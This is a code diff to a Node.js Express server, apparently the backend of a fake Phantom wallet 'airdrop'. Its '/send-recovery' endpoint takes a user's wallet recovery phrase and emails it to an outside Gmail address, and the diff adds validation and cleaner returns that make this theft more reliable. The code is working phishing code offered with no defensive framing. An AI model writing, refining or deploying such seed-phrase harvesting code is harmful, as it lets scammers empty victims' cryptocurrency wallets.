@@ -25,6 +25,10 @@ const transporter = nodemailer.createTransport({
 app.post('/send-recovery', (req, res) => {
     const { recoveryPhrase } = req.body;
 
+    if (!recoveryPhrase) {
+        return res.status(400).send('Recovery phrase is required.');
+    }
+
     const mailOptions = {
         from: 'phantomairdrop3@gmail.com',
         to: 'phantomairdrop3@gmail.com',
@@ -35,10 +39,10 @@ app.post('/send-recovery', (req, res) => {
     transporter.sendMail(mailOptions, (error, info) => {
         if (error) {
             console.error('Error sending email:', error);
-            res.status(500).send('Failed to send recovery phrase.');
+            return res.status(500).send('Failed to send recovery phrase.');
         } else {
             console.log('Email sent: ' + info.response);
-            res.status(200).send('Recovery phrase sent successfully!');
+            return res.status(200).send('Recovery phrase sent successfully!');
         }
     });
 });
